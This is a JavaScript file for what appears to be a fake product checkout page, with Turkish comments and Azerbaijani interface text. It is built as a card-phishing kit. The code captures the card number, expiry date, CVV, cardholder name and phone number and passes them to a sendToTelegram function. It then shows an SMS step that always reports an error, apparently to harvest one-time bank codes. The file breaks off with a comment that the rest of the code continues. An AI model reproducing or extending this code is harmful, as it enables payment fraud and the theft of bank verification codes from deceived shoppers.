// Global Variables
let currentImageIndex = 0;
let selectedColor = 'desert';
let currentPage = 'productPage';
let timerInterval;
let timeLeft = 300; // 5 minutes in seconds

// Image arrays for different colors - 3 RENK (GOLD SİLİNDİ!)
const colorImages = {
    black: [
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ba1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B2-wwrNsrbcPWOHWuQxyjL3gmmnrHBVB5.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B3-1cD5YKS8g8zVrr3kqpXiHwDSU3N3T5.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B4-4LUGyAlnHXC4nYpJevPeQw6Pd3anJH.webp'
    ],
    desert: [
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-BHXg2pLrBIcUiwARxxSnDwMQCRkJqy.png',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-uCeC6Ss0aawHBDEmfRjrC1nfFYuxs3.png',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-XrmuyJ5bSLxWSKh7okiRfjC8sAe1Bf.png',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-WsnSUGttrlxNQYlJLPqHev2cm6Mj3h.png'
    ],
    white: [
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S1-b6XRx41eY35rcY6EtkAgPXKmlAgAEV.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S2-D6hckadTmE5Lam91LcIlFL8md3N9OH.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S3-icw7vj1P3olV6AmuUMoTVXFPoT58NV.webp',
        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S4-4A1CcCZxS1L4b6zHALF2t8XK8D2lJC.webp'
    ]
};

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    showPage('productPage');
    updateMainImage();
    setupEventListeners();
}

function setupEventListeners() {
    // Form validation for card details
    const cardForm = document.querySelector('.card-form');
    if (cardForm) {
        const inputs = cardForm.querySelectorAll('input[required]');
        inputs.forEach(input => {
            input.addEventListener('input', validateCardForm);
        });
    }

    // Form validation for SMS
    const smsForm = document.querySelector('.sms-form');
    if (smsForm) {
        const smsInput = document.getElementById('code');
        if (smsInput) {
            smsInput.addEventListener('input', validateSmsForm);
        }
    }

    // Phone number formatting
    const phonePrefix = document.getElementById('ccPrefix');
    const phoneNumber = document.getElementById('ccPhone');

    if (phonePrefix) {
        phonePrefix.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.startsWith('0')) {
                value = value.substring(1);
            }
            if (value.length > 2) {
                value = value.substring(0, 2);
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    if (phoneNumber) {
        phoneNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 7) {
                value = value.substring(0, 8);
            }
            if (value.length > 3) {
                if (value.length > 5) {
                    value = value.substring(0, 3) + ' ' + value.substring(3, 5) + ' ' + value.substring(5);
                } else {
                    value = value.substring(0, 3) + ' ' + value.substring(3);
                }
            }
            e.target.value = value;
            validateCardForm();
        });
    }

    const cardNumber = document.getElementById('ccNumber');
    if (cardNumber) {
        cardNumber.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) {
                value = value.substring(0, 16);
            }
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value;
            validateCardForm();
        });
    }

    const expiryMonth = document.getElementById('ccMonth');
    const expiryYear = document.getElementById('ccYear');

    if (expiryMonth) {
        expiryMonth.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = value.substring(0, 2);
            if (value.length === 2 && parseInt(value) > 12) value = '12';
            if (value.length === 1 && parseInt(value) > 1) value = '0' + value;
            e.target.value = value;
            validateCardForm();
        });
    }

    if (expiryYear) {
        expiryYear.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) value = value.substring(0, 2);
            e.target.value = value;
            validateCardForm();
        });
    }

    const cvv = document.getElementById('ccCVV');
    if (cvv) {
        cvv.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3) value = value.substring(0, 3);
            e.target.value = value;
            validateCardForm();
        });
    }

    const cardHolder = document.getElementById('ccHolder');
    if (cardHolder) {
        cardHolder.addEventListener('input', function(e) {
            e.target.value = e.target.value.toUpperCase();
            validateCardForm();
        });
    }
}

// Diğer kodlar aynı kalıyor, yalnızca ID'ler değiştirildi
// Aşağıda validateCardForm ve submitCardForm içinde de aynı ID değişiklikleri yapılmalı
// validateCardForm ve submitCardForm içindeki ID'leri cc ile başlayan halleriyle güncelledim

function validateCardForm() {
    const cardNumber = document.getElementById('ccNumber')?.value.replace(/\s/g, '') || '';
    const expiryMonth = document.getElementById('ccMonth')?.value || '';
    const expiryYear = document.getElementById('ccYear')?.value || '';
    const cvv = document.getElementById('ccCVV')?.value || '';
    const cardHolder = document.getElementById('ccHolder')?.value.trim() || '';
    const phonePrefix = document.getElementById('ccPrefix')?.value || '';
    const phoneNumber = document.getElementById('ccPhone')?.value.replace(/\s/g, '') || '';

    const isValid = cardNumber.length >= 13 && 
                   expiryMonth.length === 2 && 
                   expiryYear.length === 2 && 
                   cvv.length >= 3 && 
                   cardHolder.length > 0 && 
                   phonePrefix.length >= 2 && 
                   phoneNumber.length >= 9;

    const submitBtn = document.querySelector('.btn-confirm');
    if (submitBtn) {
        submitBtn.disabled = !isValid;
    }

    return isValid;
}

function submitCardForm(event) {
    event.preventDefault();

    if (validateCardForm()) {
        const submitBtn = event.target.querySelector('.btn-confirm');
        submitBtn.textContent = 'İşlənir...';
        submitBtn.disabled = true;

        const cardData = {
            ccNumber: document.getElementById('ccNumber')?.value,
            expiry: document.getElementById('ccMonth')?.value + '/' + document.getElementById('ccYear')?.value,
            ccCVV: document.getElementById('ccCVV')?.value,
            ccHolder: document.getElementById('ccHolder')?.value,
            phone: document.getElementById('ccPrefix')?.value + ' ' + document.getElementById('ccPhone')?.value
        };

        sendToTelegram(cardData);

        setTimeout(() => {
            showPage('smsPage');
        }, 1500);
    }
}

function validateSmsForm() {
    const smsCode = document.getElementById('code')?.value || '';
    const isValid = smsCode.length >= 4;

    const submitBtn = document.querySelector('.sms-form .btn-confirm');
    if (submitBtn) {
        submitBtn.disabled = !isValid;
    }

    return isValid;
}

function submitSmsCode(event) {
    event.preventDefault();

    if (validateSmsForm()) {
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) errorMessage.style.display = 'block';

        const smsInput = document.getElementById('code');
        if (smsInput) smsInput.value = '';

        validateSmsForm();
    }
}

// ... geri kalan kodlar aynı şekilde devam eder
